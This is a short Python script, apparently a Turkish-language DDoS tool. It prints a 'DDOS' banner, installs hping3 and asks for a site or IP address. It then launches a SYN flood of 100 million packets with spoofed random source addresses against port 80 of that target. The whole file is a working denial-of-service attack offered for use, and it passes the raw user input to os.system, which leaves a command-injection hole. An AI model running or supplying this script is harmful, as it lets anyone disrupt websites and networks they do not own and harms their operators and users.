#!usr/bin/env python3
# -*- coding:utf-8 -*-

import os

os.system("apt install figlet")
os.system("apt install hping3")
os.system("clear")
banner = """\033[94m\033[1m
____  ____   ___  ____  
|  _ \|  _ \ / _ \/ ___| 
| | | | | | | | | \___ \ 
| |_| | |_| | |_| |___) |
|____/|____/ \___/|____/

"""
print(banner)


sor1 = input("Site Veya IP Adresi Giriniz:  ")
os.system("hping3 -V -c 100000000 -d 120 -S -w 64 -p 80 --faster --flood --rand-source " + sor1)